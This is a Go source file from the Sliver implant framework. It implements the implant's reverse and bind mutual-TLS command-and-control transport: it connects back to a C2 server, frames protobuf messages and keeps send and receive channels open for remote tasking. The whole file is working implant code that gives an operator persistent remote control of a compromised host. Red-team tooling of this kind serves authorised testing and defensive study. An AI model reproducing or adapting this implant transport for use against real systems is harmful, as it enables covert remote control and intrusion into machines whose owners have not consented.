package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.MTLSc2Enabled}}

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/url"
	"strconv"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

// mtlsConnect - Reverse Mutual TLS implant transport.
func mtlsConnect(uri *url.URL) (*Connection, error) {
	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}
	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
	if err != nil {
		return nil, err
	}
	if conn == nil {
		// {{if .Config.Debug}}
		log.Printf("NO TLS CONNECTION")
		// {{end}}
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[mtls] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := socketReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
			}
		}
	}()

	return connection, nil
}

// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

func socketWritePing(connection *tls.Conn) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
	envelope := sliverpb.Envelope{
		Type: sliverpb.MsgPing,
		Data: pingBuf,
	}
	return socketWriteEnvelope(connection, &envelope)
}

// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || connection == nil {
		panic("[[GenerateCanary]]")
	}
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

func listenMTLS(uri *url.URL) (c *Connection, err error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}

	// Get the TLS config for a bind connection.
	tlsConfig := newCredentialsTLS().ServerConfig(uri.Hostname())

	// Start listening for incoming TLS connections
	ln, err := tls.Listen("tcp", fmt.Sprintf("%s:%d", uri.Hostname(), lport), tlsConfig)

	for {
		conn, err := ln.Accept()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Accept failed: %s", err.Error())
			// {{end}}
		}

		// Kill the listener: we don't have more than one C2 master at once.
		err = ln.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Listener close error: %s", err.Error())
			// {{end}}
		}

		// Setup the MTLS connection and return it.
		c, err := handleSliverConnection(conn.(*tls.Conn))
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("MTLS connection setup error: %s", err.Error())
			// {{end}}
		}

		return c, nil
	}

	return nil, errors.New("Did not accept any MTLS connection from C2")
}

func handleSliverConnection(conn *tls.Conn) (*Connection, error) {

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[mtls] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := socketReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
			}
		}
	}()

	return connection, nil
}

// tlsConnect - Get a TLS connection or die trying
func tlsConnect(address string, port uint16) (*tls.Conn, error) {

	// Get the TLS config for a reverse connection.
	tlsConfig := newCredentialsTLS().ClientConfig("")
	// tlsConfig := getTLSConfig()

	if tlsConfig == nil {
		// {{if .Config.Debug}}
		log.Printf("NO TLS CONFIG")
		// {{end}}
	}

	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	return connection, nil
}

// {{end}} -MTLSc2Enabled
